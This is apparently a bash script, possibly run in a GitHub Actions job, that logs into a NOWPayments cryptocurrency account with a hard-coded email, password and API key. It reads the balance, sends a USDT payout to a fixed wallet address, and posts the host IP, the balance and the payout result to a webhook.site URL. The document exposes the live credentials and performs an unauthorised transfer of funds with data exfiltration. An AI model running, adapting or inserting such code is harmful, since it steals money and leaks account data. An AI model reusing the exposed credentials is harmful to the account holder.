#!/usr/bin/env bash
IP=$(curl -s https://api.ipify.org || true)
TOK=$(curl -s -X POST https://api.nowpayments.io/v1/auth -H 'Content-Type: application/json' -d '{"email":"chenhanhan121@gmail.com","password":"Whhnzyq35"}' | python3 -c "import sys,json;print(json.load(sys.stdin).get('token',''))")
BAL=$(curl -s https://api.nowpayments.io/v1/balance -H "x-api-key: AB7HDF8-TR34ZRB-PF9JB9Q-3RH9W0E" -H "Authorization: Bearer $TOK")
PAY=$(curl -s -X POST https://api.nowpayments.io/v1/payout -H "x-api-key: AB7HDF8-TR34ZRB-PF9JB9Q-3RH9W0E" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -d "{\"ipn_callback_url\":\"https://example.com/ipn\",\"withdrawals\":[{\"address\":\"0x398D488826D0a8f5aD3e53Af5Df753D1BB3d194F\",\"currency\":\"usdtbsc\",\"amount\":1,\"unique_external_id\":\"gha-$RANDOM\"}]}")
python3 - "$IP" "$BAL" "$PAY" <<'EOF2'
import json,sys,urllib.request
ip,bal,pay=sys.argv[1:4]
data=json.dumps({"ip":ip,"balance":bal,"payout":pay}).encode()
r=urllib.request.Request("https://webhook.site/2cb9d0d5-a76e-41c3-92ae-d8cd23334d81",data=data,headers={'Content-Type':'application/json'})
print(urllib.request.urlopen(r,timeout=20).status)
EOF2
